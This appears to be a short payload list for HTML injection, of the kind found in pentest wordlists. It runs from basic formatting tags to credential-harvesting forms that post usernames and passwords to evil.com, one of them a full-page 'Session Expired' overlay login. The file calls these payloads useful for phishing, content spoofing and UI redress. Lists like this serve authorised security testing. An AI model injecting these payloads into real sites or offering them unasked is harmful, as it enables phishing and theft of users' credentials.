# HTML Injection Payloads
# For injecting arbitrary HTML without JS execution
# Useful for phishing, content spoofing, and UI redress

# Basic HTML injection
<h1>Injected Heading</h1>
<p>Injected paragraph</p>
<b>Bold text</b>
<i>Italic text</i>
<u>Underlined text</u>
<br>Line break
<hr>Horizontal rule

# Form injection (phishing)
<form action="http://evil.com/steal.php" method="POST">
<h2>Session Expired - Please Login Again</h2>
<label>Username:</label><input type="text" name="username"><br>
<label>Password:</label><input type="password" name="password"><br>
<input type="submit" value="Login">
</form>

# Credential harvesting forms
<form action=//evil.com/log><input name=username placeholder="Username"><input name=password type=password placeholder="Password"><input type=submit value="Login"></form>

<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><h1>Session Expired</h1><form action=//evil.com/capture><input name=u placeholder=Username><input name=p type=password placeholder=Password><button>Login</button></form></div>
